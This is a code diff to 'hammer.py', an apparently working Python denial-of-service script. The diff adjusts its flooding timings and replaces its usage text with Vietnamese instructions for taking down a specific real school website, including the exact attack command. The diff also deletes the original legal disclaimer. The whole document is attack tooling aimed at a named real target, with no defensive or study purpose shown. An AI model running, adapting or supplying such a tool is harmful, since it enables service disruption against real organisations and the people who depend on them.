@@ -38,7 +38,7 @@ def bot_hammering(url):
 			print("\033[94mbot is hammering...\033[0m")
 			time.sleep(.1)
 	except:
-		time.sleep(.0)
+		time.sleep(.1)
 
 
 def down_it(item):
@@ -53,7 +53,7 @@ def down_it(item):
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
-			time.sleep(.0)
+			time.sleep(.1)
 	except socket.error as e:
 		print("\033[91mno connection! server maybe down\033[0m")
 		#print("\033[91m",e,"\033[0m")
@@ -75,16 +75,14 @@ def dos2():
 
 
 def usage():
-	print (''' \033[92m	Hammer Dos Script v.1 http://www.canyalcin.com/
-	It is the end user's responsibility to obey all applicable laws.
-	It is just for server testing script. Your ip is visible. \n
-	usage : python3 hammer.py [-s] [-p] [-t]
-	-h : help
-	-s : server ip
-	-p : port default 80
-	-t : turbo default 135 \033[0m''')
+	print (''' \033[92m Tools Được Viết Bởi Nguyễn Hoàng Ân
+Để bắt đầu chạy tools bạn cần viết lệnh như thế này,
+Ví dụ : mình muốn đánh sập web này 
+Ví dụ : http://thcslongthoi.sgdtravinh.edu.vn/
+Thì cáAac bạn bỏ cho mình dòng https nha các bạn
+Các bạn cần nhập như thế này để đánh sập web
+>>> python3 hammer.py -s thcslongthoi.sgdtravinh.edu.vn	[0m''')
 	sys.exit()
-
 
 def get_parameters():
 	global host
@@ -133,7 +131,7 @@ if __name__ == '__main__':
 	print("\033[94mPlease wait...\033[0m")
 	user_agent()
 	my_bots()
-	time.sleep(0)
+	time.sleep(5)
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect((host,int(port)))
@@ -153,9 +151,9 @@ if __name__ == '__main__':
 		#tasking
 		item = 0
 		while True:
-			if (item>18000): # for no memory crash
+			if (item>1800): # for no memory crash
 				item=0
-				time.sleep(.0)
+				time.sleep(.1)
 			item = item + 1
 			q.put(item)
 			w.put(item)
